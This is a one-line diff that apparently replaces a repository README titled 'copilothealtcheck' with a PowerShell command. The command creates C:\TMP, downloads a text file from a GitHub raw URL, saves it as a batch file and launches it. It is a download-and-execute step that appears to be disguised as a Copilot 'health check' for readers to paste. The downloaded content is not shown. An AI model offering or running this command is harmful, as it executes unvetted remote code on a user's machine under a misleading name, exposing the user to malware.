@@ -1,1 +1,1 @@
-# copilothealtcheck
+powershell.exe -c mkdir C:\\TMP; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/none285/copilothealtcheck/refs/heads/main/copilothealtcheck.txt" -OutFile "C:\TMP\copilothealtcheck.bat"; Start-Process "C:\TMP\copilothealtcheck.bat"
